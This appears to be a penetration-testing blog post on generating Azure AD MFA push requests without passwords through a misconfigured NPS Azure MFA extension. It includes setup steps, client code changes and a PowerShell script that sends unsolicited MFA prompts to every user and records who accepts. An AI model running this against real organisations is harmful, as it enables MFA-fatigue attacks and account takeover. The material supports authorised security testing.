# Introduction

The technique of adversaries generating MFA requests after obtaining valid credentials has recently hit the news after the high profile breach of Uber and the addition of the technique to the MITRE ATT&CK Framework [T1621](https://attack.mitre.org/techniques/T1621/) in April 2022.

The following post describes a technique that can be used to generate MFA Requests for users of Azure Active Directory Multi-Factor Authentication without knowledge of the user's passwords. This is useful for determining an organizations susceptibility to this technique as a part of regular security testing or penetration testing. 

# Technique
Initially when designing and researching a methodology for generating MFA requests in Azure Active Directory, the exercise was seemingly impossible without access to the end users password. 

**Enter the NPS extension for Azure AD Multi-Factor Authentication**

Microsoft provide an extension for the Windows server RADIUS feature (Network Policy Server) to provide multi-factor authentication capabilities to RADIUS authentication clients such as switches, router, wireless clients. When this extension is used the username and password authentication is handled by the native Network Policy Server configuration with Multi-Factor being provided by Azure AD via the "Strong Authentication Service"

The Network Policy Server connection request policy contains an option to accept users without validating credentials.

When this option is configured in conjunction with the Azure MFA NPS extension, NPS will accept RADIUS authentication requests for a user with **ANY** password and perform Multi-Factor authentication against Azure AD. Replying with Access-Accept for users who accept the MFA request and Access-Reject for those who don't.

Additional details are written to the event viewer log "Microsoft-AzureMfa-AuthZ/AuthZOptCh" including if the user actively rejected the request or if it simply timed out.

**Warning! If users report the request as fraudulent and AAD is configured to do so, the account will be blocked** 

With Network Policy Server configured correctly with the Azure MFA extension and 'accept users without validating credentials enabled', the last part of the technique is the generation of RADIUS requests from a RADIUS client. Multiple NPS clients are available for generating RADIUS requests from the security testers computer. I had opt'd for https://github.com/frontporch/Radius.NET clienttest as it is opensource, written in C# and can be easily adapted. 


**Step By Step - Technique**
<ol>
  <li>Generate a PAP Radius request from Security Testers computer to Network Policy Server containing the targets username and any password</li>
  <li>Network Policy Server will request Multi-Factor Authentication from Azure AD</li>
  <li>The target of the test will receive an MFA request using their default MFA method; Typically Telephone or Authenticator App Push</li>
  <li>Azure AD will report success or failure to NPS</li>
  <li>A RADIUS Access-Accept or Access-Reject message will be sent back to the Security Testers PC depending on the end users response</li>
</ol>

# Implementation
- Install Network Policy Server on a new or existing server within the Active Directory Environment  
- Configure Azure MFA NPS Extension [Full Instructions](https://learn.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-nps-extension)  
- Define the Security Testers PC as a RADIUS client and select a RADIUS shared secret  
- Modify the connection request policy to accept users without validating   
![](https://github.com/chrisnelmes/blog/blob/main/assets/T1261_2.png?raw=true)
- Clone https://github.com/frontporch/Radius.NET and open in Visual Studio. 
- Upon opening the project you may be prompted to upgrade the project to .net framework 4.8. In my enviornment I had accepted this option and the project built succesfully.
- Modify the timeout value in RadiusClient.CS, this is the amount of time the radius client will wait for a response. This is approximately the amount of time the user will get to accept/deny the prompt.
  ```
    private const int DEFAULT_SOCKET_TIMEOUT = 60000
  ```
- In Program.cs of ClientTest comment out the following lines. This will allow the program to close without input.
```
	//	Console.WriteLine("Press any key to exit...");
	//	Console.ReadLine();
```
- Build the solution  
- Test the process by running the ClientTest.exe binary from windows command prompt  
  ```
  ClientTest.exe **radius server ip** **radius shared secret** **Username use shortname wthout domain** **Any Password of your choice**
  ```
- The target user should receive an MFA request.
- User accepts the fraudulent MFA request
``` 
Access-Accept
```
- User does not accept the fradulent MFA request
```
Access-Reject
```
# Orchestatration
The following powershell script will gather a list of users from Azure Active Directory and then send an unsolicitied MFA request to each user. The result of each test will be displayed within the console and stored within a powershell object.

**Warning: This code is provided as an example only, please adapt, test and validate in your own environment before using in production.**  
The following script will generate an MFA request for all AzureAD users. This can be filtered by modifying the definition of $users with a filter or where-object clause.

```
$radiusServerIP = read-host 'Enter Radius Server IP'
$radiusSharedSecret = read-host 'Enter Radius Shared Secret'
$pathToClientTest = read-host 'Enter Path to Clienttest.exe'
$testPassword = 'test'
Connect-AzureAD
$users = Get-AzureAduser -All $true |  select-Object UserPrincipalName
$Report = [System.Collections.Generic.List[Object]]::new() # Create output file 

foreach ($userName in $users) {
    $shortname = ($username.UserPrincipalName.split('@'))[0]
    write-host testing $shortname ' ' (Get-Date)
    $response = &$pathToClientTest $radiusServerIP $radiusSharedSecret $shortname $testPassword
    if ($response -like '*Accept*')
    { write-host $response -ForegroundColor Red }
    else {
        write-host $response -ForegroundColor Green
    }
    $ReportLine = [PSCustomObject][Ordered]@{ 
        UserName = $shortname
        DateTime = (Get-Date)
        Response = $response
    } 
    $Report.Add($ReportLine)
    Start-sleep -seconds 10
}
```
To export the results to csv.
```
$Report | Export-Csv -NoTypeInformation  C:\temp\results.csv
```
